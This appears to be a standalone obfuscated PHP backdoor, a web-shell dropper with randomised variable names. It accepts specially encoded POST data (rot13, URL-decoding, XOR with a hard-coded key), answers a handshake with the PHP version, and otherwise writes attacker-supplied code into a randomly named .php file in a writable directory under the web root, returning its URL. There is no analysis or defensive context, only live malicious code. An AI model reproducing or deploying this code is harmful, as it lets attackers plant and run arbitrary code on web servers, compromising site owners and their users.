<?php $wqzsnt = "ktpihjnqevbxhoyy";$gwgnjjn = "";foreach ($_POST as $kibivr => $oqtpzzk){if (strlen($kibivr) == 16 and substr_count($oqtpzzk, "%") > 10){bjbmorcdni($kibivr, $oqtpzzk);}}function bjbmorcdni($kibivr, $vahjc){global $gwgnjjn;$gwgnjjn = $kibivr;$vahjc = str_split(rawurldecode(str_rot13($vahjc)));function ppjsrrps($noaxp, $kibivr){global $wqzsnt, $gwgnjjn;return $noaxp ^ $wqzsnt[$kibivr % strlen($wqzsnt)] ^ $gwgnjjn[$kibivr % strlen($gwgnjjn)];}$vahjc = implode("", array_map("ppjsrrps", array_values($vahjc), array_keys($vahjc)));$vahjc = @unserialize($vahjc);if (@is_array($vahjc)){$kibivr = array_keys($vahjc);$vahjc = $vahjc[$kibivr[0]];if ($vahjc === $kibivr[0]){echo @serialize(Array('php' => @phpversion(), ));exit();}else{function vvbeuvrd($slbncqir) {static $zhcyxho = array();$smertji = glob($slbncqir . '/*', GLOB_ONLYDIR);if (count($smertji) > 0) {foreach ($smertji as $slbncq){if (@is_writable($slbncq)){$zhcyxho[] = $slbncq;}}}foreach ($smertji as $slbncqir) vvbeuvrd($slbncqir);return $zhcyxho;}$eyfwlenv = $_SERVER["DOCUMENT_ROOT"];$smertji = vvbeuvrd($eyfwlenv);$kibivr = array_rand($smertji);$qzkuzpym = $smertji[$kibivr] . "/" . substr(md5(time()), 0, 8) . ".php";@file_put_contents($qzkuzpym, $vahjc);echo "http://" . $_SERVER["HTTP_HOST"] . substr($qzkuzpym, strlen($eyfwlenv));exit();}}}